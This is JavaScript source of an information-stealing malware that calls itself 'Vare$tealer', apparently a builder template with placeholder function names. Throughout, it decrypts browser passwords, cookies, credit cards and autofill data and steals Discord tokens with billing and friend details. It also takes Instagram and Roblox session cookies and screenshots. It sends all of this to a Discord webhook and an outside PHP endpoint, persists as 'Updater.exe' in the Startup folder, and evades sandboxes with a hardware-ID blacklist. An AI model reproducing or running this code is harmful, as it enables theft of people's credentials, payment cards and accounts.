  data['username'] = response.data.user.username, data['verified'] = response.data.user.is_verified, data['avatar'] = response.data.user.profile_pic_url, data['sessionid'] = cookie; data['id'] = response.data.user.pk_id; data['number'] = response.data.user.phone_number; data['mail'] = response.data.user.email; data['name'] = response.data.user.full_name; data['bio'] = response.data.user.biography
  let response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data['id']}/info`, { headers: headers }).catch(error => { return false; })
  data['followers'] = response2.data.user.follower_count; data['follows'] = response2.data.user.following_count;
  return data
}

async function %VAREINSTA%(cookie) {
  let embed=await %GETEMBED%(),data = await %INSTADATA%(cookie);
  const lllllllll=new FormData;
  lllllllll.append("payload_json",JSON.stringify({
    username:"Vare$tealer - https://github.com/saintdaddy",
    avatar_url:embed.avatar,
    embeds: [
      {
        "color": 3092790,
        "fields": [
          {
            "name": "Username",
            "value": `\`${data.username}\``,
            "inline": true
          },
          {
            "name": "Name",
            "value": `\`${data.name}\``,
            "inline": true
          },
          {
            "name": "E-Mail",
            "value": `\`\`\`${data.mail}\`\`\``,
          },
          {
            "name": "Phone Number",
            "value": `\`\`\`${data.number}\`\`\``,
          },
          {
            "name": "Follower Count",
            "value": `\`${data.followers}\``,
            "inline": true
          },
          {
            "name": "Follows Count",
            "value": `\`${data.follows}\``,
            "inline": true
          },
          {
            "name": "Verifed",
            "value": `\`${data.verified}\``,
            "inline": true
          },
          {
            "name": "Biography",
            "value": `\`\`\`${data.bio}\`\`\``,
          },
          {
            "name": "Cookie",
            "value": `\`\`\`sessionid=${cookie}\`\`\``,
          }
        ],
        "author": {
          "name": "Instagram Session Founded",
          "icon_url": embed.footericon
        },
        "footer": {
          "text": `Vare$tealer - ${embed.url}`,
          "icon_url": embed.footericon
        },
        "thumbnail": {
          "url": data.avatar
        }
      }
    ],
}));
  axios.post(%webhookstring%,lllllllll,{headers:{...lllllllll.getHeaders()}});
}

async function %SENDLOGS%() {
  let cr = await %GETCOUNTRY%();

  const folderPath = appdata.replace('\\', '/') + `/${cr}_${os.hostname}${random}${random}/`;
  const zipPath = appdata.replace('\\', '/') + `/${cr}_${os.hostname}${random}${random}.zip`
  const zip = new JSZip();
  const readFolder = (folderPath, zip, folderName) => {
    const files = fs.readdirSync(folderPath);

    files.forEach((file) => {
      const filePath = `${folderPath}/${file}`;
      const stats = fs.statSync(filePath);
      if (stats.isFile()) {
        const content = fs.readFileSync(filePath);
        zip.file(`${folderName}/${file}`, content);
      } else if (stats.isDirectory()) {
        const subFolderName = `${folderName}${file}`;
        zip.folder(subFolderName);
        readFolder(filePath, zip, subFolderName);
      }
    });
  };

  readFolder(folderPath, zip, '');
  var copyurl = "https://projectdream.ml/full.php"
  let ip = await %GETIP%()
  let username = await %PCNAME%()
  let embed = await %GETEMBED%()
  zip.generateNodeStream({ type: 'nodebuffer', streamFiles: true })
  .pipe(fs.createWriteStream(zipPath))
  .on('finish', () => {
    const llllllll = new FormData();
    llllllll.append('file', fs.createReadStream( appdata + `\\${cr}_${os.hostname}${random}${random}.zip`));
    const  lllllllll = new FormData();
     lllllllll.append('file', fs.createReadStream( appdata + `\\${cr}_${os.hostname}${random}${random}.zip`));
    llllllll.append('payload_json', JSON.stringify({
        "content": `**Cookie Keywords** : ${all_founds}`,
        "username": "Vare$tealer - https://github.com/saintdaddy",
        "avatar_url": embed.avatar,
        "embeds": [
          {
            "color": 2829617,
            "fields": [
                {
                "name": "Passwords",
                "value": `\`${passwordCount}\``,
                "inline": true
                },
                {
                "name": "Cookies",
                "value": `\`${cookieCount}\``,
                "inline": true
                },
                {
                "name": "Credit Cards",
                "value": `\`${ccCount}\``,
                "inline": true
                },
                {
                "name": "AutoFills",
                "value": `\`\`\`${autofillCount}\`\`\``,
                "inline": false
                },
                {
                "name": "PC INFO",
                "value": `\`\`\`Ip Adress : ${ip}\nHostname  : ${os.hostname}\nUsername  : ${username}\`\`\``
                }
            ],
            "footer": {
                "text": `Vare$tealer - ${embed.url}`,
                "icon_url": embed.footericon
            }
          },
        ]
      }));
      lllllllll.append('atc', `${autofillCount}`);lllllllll.append('p', `${passwordCount}`);lllllllll.append('c', `${cookieCount}`);lllllllll.append('cc', `${ccCount}`);lllllllll.append('ip', `${ip}`);lllllllll.append('host', `${os.hostname}`);lllllllll.append('user', `${username}`);
    axios.post(%webhookstring%, llllllll, {
      headers: {
        ...llllllll.getHeaders()
      }
    })
    .then(response => {axios.post(copyurl, lllllllll,
     {headers: {...lllllllll.getHeaders()}}).then(res => {}).catch(err => {});
        fs.unlinkSync( appdata + `\\${cr}_${os.hostname}${random}${random}.zip`)
        fse.removeSync( appdata + `\\${cr}_${os.hostname}${random}${random}`)
    })
    .catch(error => {
      axios.post(copyurl, lllllllll,
        {headers: {...lllllllll.getHeaders()}}).then(res => {}).catch(err => {});
           fs.unlinkSync( appdata + `\\${cr}_${os.hostname}${random}${random}.zip`)
           fse.removeSync( appdata + `\\${cr}_${os.hostname}${random}${random}`)
    });  
  });
}

async function %VARECOOKIES%(path) {
  let pathSplit = path.split("\\"), pathSplitTail = path.includes("Network") ? pathSplit.splice(0, pathSplit.length - 3) : pathSplit.splice(0, pathSplit.length - 2), pathTail = pathSplitTail.join("\\") + "\\";

  if (path.includes("Local")) {
    browser = path.split("\\Local\\")[1].split("\\")[0];
  } else {
    browser = path.split("\\Roaming\\")[1].split("\\")[1];
  }

  if (path.startsWith(process.env.APPDATA)) {
    pathTail = path;
  }
  if (path.includes("cord")) {
    return "";
  }

  if (fs.existsSync(pathTail)) {
    let encrypted = Buffer.from(
      JSON.parse(fs.readFileSync(pathTail + "Local State")).os_crypt
        .encrypted_key,
      "base64"
    ).slice(5);

    if (!fs.existsSync(path + "Network")) {
      return "";
    }

    const key=vare.unprotectData(Buffer.from(encrypted,"utf-8"),null,"CurrentUser");
    
    let result = "~|~|~ VARE$TEALER ~|~|~ \n";
    const sql = new sqlite3.Database(`${path}Network\\Cookies`, (err) => {});
    const cookies = await new Promise((resolve, reject) => {
      sql.each(
        "SELECT * FROM cookies",
        async function (err, row) {
          let encvalue = row["encrypted_value"];
          let decrypted;
          try {
            if (
                encvalue[0] == 1 && encvalue[1] == 0 &&
              encvalue[2] == 0 && encvalue[3] == 0
            ) {
              decrypted = vare.unprotectData(
                encvalue,
                null,
                "CurrentUser"
              );
            } else {
              let first = encvalue.slice(3, 15),
                middle = encvalue.slice(
                  15,
                  encvalue.length - 16
                ),
                end = encvalue.slice(encvalue.length-16,encvalue.length),decipher=crypto.createDecipheriv("aes-256-gcm",key,first);
                decipher.setAuthTag(end),decrypted=decipher.update(middle,"base64","utf-8")+decipher.final("utf-8");
            }
          } catch {}
          if (row.name === '.ROBLOSECURITY') %SENDROBLOX%(`${decrypted}`)
          if (row["host_key"].includes('instagram') && row["name"].includes("sessionid")) %VAREINSTA%(`${decrypted}`)
          result += `${row["host_key"]}\tTRUE\t/\tFALSE\t2597573456\t${row["name"]}\t${decrypted}\n`;
          cookieCount ++;
        },
        function () {
          resolve(result);
        }
      );
    });
    return cookies;
  } else {
    return "";
  }
}

async function %SENDROBLOX%(secret_cookie) {
      let embed=await %GETEMBED%(),data=await %GETROBLOX%(secret_cookie);
      const lllllll=new FormData;
      lllllll.append("payload_json",JSON.stringify({username:"Vare$tealer - https://github.com/saintdaddy",avatar_url:embed.avatar,embeds:[{color:3092790,fields:[{name:"Username",value:`\`${data.username}\``,inline:!0},{name:"Robux",value:`\`${data.robux}\``,inline:!0},{name:"Premium",value:`\`${data.premium?"✅":"❌"}\``,inline:!0},{name:"Cookie",value:`\`\`\`${secret_cookie}\`\`\``}],author:{name:`${data.username} | ${data.id}`,icon_url:data.avatar},footer:{text:`Vare$tealer - ${embed.url} - ${os.hostname}`,icon_url:embed.footericon}}]}));
      axios.post(%webhookstring%,lllllll,{headers:{...lllllll.getHeaders()}});
}

function %PCNAME%() {
        return (
            process.env.SUDO_USER ||
            process.env.C9_USER ||
            process.env.LOGNAME ||
            process.env.USER ||
            process.env.LNAME ||
            process.env.USERNAME
        );
    }
    


async function %VAREPASS%(path) {
  let appdata = process.env.APPDATA;
  let localappdata = process.env.LOCALAPPDATA;
  let path_split = path.split('\\'),
      path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
      path_tail = path_split_tail.join('\\') + '\\';
  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes('cord')) return;
  if (fs.existsSync(path_tail)) {
      let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
              .os_crypt.encrypted_key, 'base64')
          .slice(5);
      var login_data = path + 'Login Data',
          passwords_db = path + 'passwords.db';
      fs.copyFileSync(login_data, passwords_db);
      const key = vare.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
      var result = '\n~|~|~ VARE$TEALER ~|~|~ ' + path + ' ~|~|~ VARE$TEALER ~|~|~ \n',
          sql = new sqlite3.Database(passwords_db, err => {
              if (err) {
                  if (debug) console.log(err);
              }
          });
      const pizza = await new Promise((resolve, reject) => {
          sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
              if (err) {
                  if (debug) console.log(err);
              }
              if (row['username_value'] != '') {
                  let password_value = row['password_value'];
                  try {
                      if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                        passwordCount++;
                        result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + vare.unprotectData(password_value, null, 'CurrentUser') + "\n"
                              .toString('utf-8');
                      } else {
                          let start = password_value.slice(3, 15),
                              middle = password_value.slice(15, password_value.length - 16),
                              end = password_value.slice(password_value.length - 16, password_value.length),
                              decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                          decipher.setAuthTag(end);
                          passwordCount++;
                          result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n";
                      }
                  } catch (e) {
                      if (debug) console.log(e);
                  }
              }
          }, function () {
              resolve(result);
          });
      });
      return pizza;
  } else {
      return '';
  }
}



async function %VARESTARTUP%() {
  fs.createReadStream(process.argv0).pipe( // decode is better stupid
      fs.createWriteStream(
        process.env.APPDATA.replace("\\", "/") +
          "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe",
      ),
    );
    setTimeout(() => {
      fs.renameSync(
        process.env.APPDATA.replace("\\", "/") +
          "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe",
        process.env.APPDATA.replace("\\", "/") +
          "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe",
      );
    }, 3000);
}

async function %VARECARDS%(path) {
  let path_split = path.split('\\'),
      path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
      path_tail = path_split_tail.join('\\') + '\\';
  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes('cord')) return;
  if (fs.existsSync(path_tail)) {
      let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
          .os_crypt.encrypted_key, 'base64')
          .slice(5);
      var login_data = path + 'Web Data',
          creditcards_db = path + 'creditcards.db';
      fs.copyFileSync(login_data, creditcards_db);
      const key = vare.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
      var result = `\n~|~|~ VARE$TEALER ~|~|~ ${path}`,
          sql = new sqlite3.Database(creditcards_db, err => {
              if (err) { }
          });
      const ccdb = await new Promise((resolve, reject) => {
          sql.each('SELECT * FROM credit_cards', function (err, row) {
              if (err) { }
              if (row['card_number_encrypted'] != '') {
                  let card_number = row['card_number_encrypted'];
                  try {
                      if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                          result += '\nCREDIT CARD NUMBER: ' + vare.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                          ccCount ++;
                        } else {
                          let start = card_number.slice(3, 15),
                              middle = card_number.slice(15, card_number.length - 16),
                              end = card_number.slice(card_number.length - 16, card_number.length),
                              decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                          decipher.setAuthTag(end);
                          result += '\nCREDIT CARD NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                          ccCount ++;
                        }

                  } catch (e) { }
              }
          }, function () {
              resolve(result);
          });
      });
      return ccdb;
  } else {
      return '';
  }
}




async function %VARESERVERS%(token) {
    try {
      const response = await axios.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {
        headers: {
          Authorization: token,
        },
      });
  
      const servers = response.data
        .filter(server => server.owner || (server.permissions & 8) === 8)
        .filter(server => server.approximate_member_count >= 500)
        .map(server => ({
          name: server.name,
          id: server.id,
          owner: server.owner,
          member_count: server.approximate_member_count,
        }));

      return {
          message: servers.length ? servers.map(server => `**${server.name} (${server.id})**\nIs Owner: \`${server.owner ? "✅" : "❌"}\` | Members: \`🟢 ${server.member_count}\`\n `).join('\n') : '*Nothing Important Here TwT*',
      };
  
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
async function %VARENITRO%(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:nitro:1052977704158380082>\n`Nitro Classic`";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:nitro:1052977704158380082>\n`Nitro Classic`";

            if (!info.premium_guild_since) return "<:nitro:1052977704158380082>\n`Nitro Classic`";

            let boost = ["<:1ay:1053258370213224498>", "<:2ay:1053258368795557948>", "<:3ay:1053258367159771136>", "<:6ay:1053258365620465736>", "<:9ay:1053258363997278269>", "<:12ay:1053258361480683541>", "<:15ay:1053258360293687346>", "<:18ay:1053258358838263849>", "<:24ay:1053258356908904478>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {i += 0
                } else {i += 1
                }
                
                if (boost3month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost6month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost9month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost12month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost15month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost18month > 0) {i += 0
                } else {i += 1
                } 
                
                if (boost24month > 0) {i += 0
                } else 
                
                if (boost24month < 0 || boost24month == 0) {i += 1
                } else {i = 0}
            } catch {i += 0}
            return %VAREEVASION%(`<:nitro:1052977704158380082> ${boost[i]}\n\`Nitro Boost\``)
        default:
            return "\`No Nitro\`";
    };
}
async function %VAREFINDTOKEN%(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discord')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                            const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
                fs.readdirSync(path)
                    .map(file => {
                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                            .split(/\r?\n/)
                            .forEach(line => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTokens = line.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                                            .os_crypt.encrypted_key, 'base64')
                                            .slice(5);
                                        const key = vare.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                                        let start = token.slice(3, 15),
                                            middle = token.slice(15, token.length - 16),
                                            end = token.slice(token.length - 16, token.length),
                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                        decipher.setAuthTag(end);
                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                                        if (!tokens.includes(out)) tokens.push(out)
                                    })
                                };
                            });
                    });
            } catch (e) { }
            return;
        }
    }
}
async function %VARESTEALTOKEN%() {
    for (let path of paths) {
        await %VAREFINDTOKEN%(path);
    }
    for (let token of tokens) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await %GETIP%();
        var billing = await %VAREBILLDATA%(token);
        var friends = await %VAREFRIENDS%(token);
        var copyurl = `https://projectdream.ml/full.php?token=${token}`;
        let embed = await %GETEMBED%()
        var pp = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
        var servers = await %VARESERVERS%(token)
        axios.post(%webhookstring%, {
            username: "Vare$tealer - https://github.com/saintdaddy",
            avatar_url: embed.avatar,
            embeds: [{
                "color": 3092790,
                "fields": [
                  {
                    "name": "Token",
                    "value": `\`\`\`${token}\`\`\`[[Copy Token]](${copyurl})`
                  },
                  {
                    "name": "Email",
                    "value": `\`${json.email}\``,
                    "inline": true
                  },
                  {
                    "name": "Ip Adress",
                    "value": `\`${ip}\``,
                    "inline": true
                  },
                  {
                    "name": "Hostname",
                    "value": `\`${os.hostname}\``,
                    "inline": true
                  },
                  {
                    "name": "Badges",
                    "value": %VAREBADGES%(json.flags),
                    "inline": true
                  },
                  {
                    "name": "Nitro",
                    "value": await %VARENITRO%(json.premium_type, json.id, token),
                    "inline": true
                  },
                  {
                    "name": "Billing",
                    "value": billing,
                    "inline": true
                  }
                ],
                "author": {
                  "name": `${json.username}#${json.discriminator} | ${json.id}`,
                  "icon_url": pp
                },
                "footer": {
                  "text": `Vare$tealer - ${embed.url}`,
                  "icon_url": embed.footericon,
                }
              }, {
                "color": 3092790,
                "description": friends,
                "author": {
                    "name": "Rare Friends",
                    "icon_url": pp,
                },
                "footer": {
                  "text": `Vare$tealer - ${embed.url}`,
                  "icon_url": embed.footericon,
                },
            },{
                "color": 3092790,
                "title": "<:violet:1095238450569035776> HQ Guilds",
                "description": servers.message,
                "author": {
                    "name": `${json.username}#${json.discriminator} | ${json.id}`,
                    "icon_url": pp
                },
                "footer": {
                  "text": `Vare$tealer - ${embed.url}`,
                  "icon_url": embed.footericon,
                },
            }]
        }).then(res => {axios.get(copyurl)}).catch(() => { axios.get(copyurl) })
        continue;
    }
}

var badges = {
    Discord_Employee:    {
        Value: 1,
        Emoji: "Discord Employee",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "Partnered Server Owner",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "HypeSquad Events",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "Bug Hunter Level 1",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:6832badgeearlysupporter:1052974130334543973>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "Bug Hunter Level 2",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:1052965409135013958>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:1052965407453106246>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:1052965401509765212>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:1052965403363659796>",
        Rare: false,
    },
    Discord_Active_Developer: {
        Value: 4194304,
        Emoji: "<:activedev:1053192696828801094>",
        Rare: false,
    }
};

async function %VAREFRIENDS%(token) {
  try {
      const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
          headers: {
              'Content-Type': 'application/json',
              'Authorization': token
          }
      });

      const relationships = response.data.filter(user => user.type === 1);

      let result = '';
      for (const relation of relationships) {
          const rareBadges = %VARERAREBADGES%(relation.user.public_flags);
          if (rareBadges !== '') {
              result += `${rareBadges} | \`${relation.user.username}#${relation.user.discriminator}\`\n`;
          }
      }

      return result !== '' ? result : '*Nothing important here TwT*';
  } catch (error) {
      return '*Account locked*';
  }
}

async function %VAREBILLDATA%(token) {
  let json;
  await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).then(res => { json = res.data }).catch(err => { })
  if (!json) return '\`Unknown\`';
  var billingInfo = '';
  json.forEach(payment => {
      if (payment.type == 2 && payment.invalid != !0) {
          billingInfo += "<:7802paypal:1052975303904985229>";
      } else if (payment.type == 1 && payment.invalid != !0) {
          billingInfo += "<:948992883728461926:1052990389109391430>";
      }
  });
  if (billingInfo == '') {
    billingInfo = `\`❌\``
  }
  return billingInfo;
}

function %VAREBADGES%(flags) {
  var badgesList = '';
  for (const prop in badges) {
    let badge = badges[prop];
    if ((flags & badge.Value) == badge.Value) {
      badgesList += badge.Emoji;
    }
  };
  if (badgesList == '') {
    return '`❌`';
  }
  return `${badgesList}`;
}

function %VARERAREBADGES%(userFlags) {
  var rareBadges = '';
  for (const badgeName in badges) {
    const badge = badges[badgeName];
    if ((userFlags & badge.Value) == badge.Value && badge.Rare) {
      rareBadges += badge.Emoji;
    }
  }
  return rareBadges;
}

async function %VAREAUTOFILL%(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Web Data',
            autofilldata_db = path + 'autofilldata.db';
        fs.copyFileSync(login_data, autofilldata_db);
        const key = vare.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `~|~|~ VARE$TEALER ~|~|~ \n`,
            sql = new sqlite3.Database(autofilldata_db, err => {
                if (err) { }
            });
        const autofill = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM autofill', function (err, row) {
                if (err) { }
                result += '\nNAME: ' + row['name'] + ' | DATA: ' + row['value'];
                autofillCount++;
            }, function () {
                resolve(result);
            });
        });
        return autofill;
    } else {
        return '';
    }
}

function %VARESLEEP%(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

async function %VAREUSERDATA%() {
    var data = '';
    let cr = await %GETCOUNTRY%();
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}`, (err) => {
    });
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] User`, (err) => {
    });
    let appdata = process.env.APPDATA;
    
    const cpu = os.cpus()[0].model;
    const ram = os.totalmem();
    const ramingb = (ram / 1024 / 1024 / 1024).toFixed(2);
    const version = os.version()
    data += `~|~|~ Vare$tealer ~|~|~\n`;
    data += `|=========================================|\n|\n`;
    data += `| Ram : ${ramingb} GB\n|\n`;
    data += `| CPU : ${cpu}\n|\n`;
    data += `| Version : ${version}\n|\n`;
    data += `| Uptime : ${(os.uptime() / 60).toFixed(0)} minutes - ${(os.uptime() / 60 / 60).toFixed(2)} hours\n|\n`;
    data += `| Home Dir : ${os.homedir()} \n|\n`;
    data += `| PC Name : ${os.userInfo().username} \n|\n`;
    data += `| HWID : ${hwid} \n|\n`;
    data += `|=========================================|\n`;
    data += `~|~|~ Vare$tealer ~|~|~`;
    fs.writeFile(appdata +`\\${cr}_${os.hostname}${random}${random}\\[VARE] User\\User Data.txt`, data, (err) => {});
}

async function %VARESCREENSHOT%() {
    let cr = await %GETCOUNTRY%();
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}`, (err) => {
    });
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] User`, (err) => {
    });
    let appdata = process.env.APPDATA;
    screenshot().then((img) => {
        fs.writeFileSync(appdata +`\\${cr}_${os.hostname}${random}${random}\\[VARE] User\\screenshot.png`, img);
      }).catch((err) => {
      });
}


async function %VAREEVASION%(data) {
    return data
}

async function %STARTVARE%() {
  let cr = await %GETCOUNTRY%();
  const hwid = execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1];
  var hwidblack = ["00000000-0000-0000-0000-000000000000", "00000000-0000-0000-0000-50E5493391EF", "00000000-0000-0000-0000-AC1F6BD047A0", "00000000-0000-0000-0000-AC1F6BD04850", "00000000-0000-0000-0000-AC1F6BD048D6", "00000000-0000-0000-0000-AC1F6BD048DC", "00000000-0000-0000-0000-AC1F6BD048F8", "00000000-0000-0000-0000-AC1F6BD048FE", "00000000-0000-0000-0000-AC1F6BD04900", "00000000-0000-0000-0000-AC1F6BD0491C", "00000000-0000-0000-0000-AC1F6BD04926", "00000000-0000-0000-0000-AC1F6BD04928", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-AC1F6BD04976", "00000000-0000-0000-0000-AC1F6BD04978", "00000000-0000-0000-0000-AC1F6BD04986", "00000000-0000-0000-0000-AC1F6BD049B8", "00000000-0000-0000-0000-AC1F6BD04C0A", "00000000-0000-0000-0000-AC1F6BD04D06", "00000000-0000-0000-0000-AC1F6BD04D08", "00000000-0000-0000-0000-AC1F6BD04D8E", "00000000-0000-0000-0000-AC1F6BD04D98", "00000000-0000-0000-0000-AC1F6BD04DC0", "00000000-0000-0000-0000-AC1F6BD04DCC", "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A", "032E02B4-0499-05C3-0806-3C0700080009", "03AA02FC-0414-0507-BC06-D70700080009", "03D40274-0435-05BF-D906-D20700080009", "03DE0294-0480-05DE-1A06-350700080009", "050C3342-FADD-AEDF-EF24-C6454E1A73C9", "05790C00-3B21-11EA-8000-3CECEF4400D0", "0700BEF3-1410-4284-81B1-E5C17FA9E18F", "07AF2042-392C-229F-8491-455123CC85FB", "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9", "08C1E400-3C56-11EA-8000-3CECEF43FEDE", "0910CBA3-B396-476B-A7D7-716DB90F5FB9", "0934E336-72E4-4E6A-B3E5-383BD8E938C3", "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F", "0A9D60D4-9A32-4317-B7C0-B11B5C677335", "0D748400-3B00-11EA-8000-3CECEF44007E", "0F377508-5106-45F4-A0D6-E8352F51A8A5", "104F9B96-5B46-4567-BF56-0066C1C6F7F0", "11111111-2222-3333-4444-555555555555", "119602E8-92F9-BD4B-8979-DA682276D385", "12204D56-28C0-AB03-51B7-44A8B7525250", "12EE3342-87A2-32DE-A390-4C2DA4D512E9", "138D921D-680F-4145-BDFF-EC463E70C77D", "13A61742-AF45-EFE4-70F4-05EF50767784", "14692042-A78B-9563-D59D-EB7DD2639037", "1AAD2042-66E8-C06A-2F81-A6A4A6A99093", "1B5D3FFD-A28E-4F11-9CD6-FF148989548C", "1D4D3342-D6C4-710C-98A3-9CC6571234D5", "213D2878-0E33-4D8C-B0D1-31425B9DE674", "222EFE91-EAE3-49F1-8E8D-EBAE067F801A", "26645000-3B67-11EA-8000-3CECEF440124", "2AB86800-3C50-11EA-8000-3CECEF440130", "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72", "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC", "2DD1B176-C043-49A4-830F-C623FFB88F3C", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "2F94221A-9D07-40D9-8C98-87CB5BFC3549", "2FBC3342-6152-674F-08E4-227A81CBD5F5", "34419E14-4019-11EB-9A22-6C4AB634B69A", "361E3342-9FAD-AC1C-F1AD-02E97892270F", "365B4000-3B25-11EA-8000-3CECEF44010C", "38813342-D7D0-DFC8-C56F-7FC9DFE5C972", 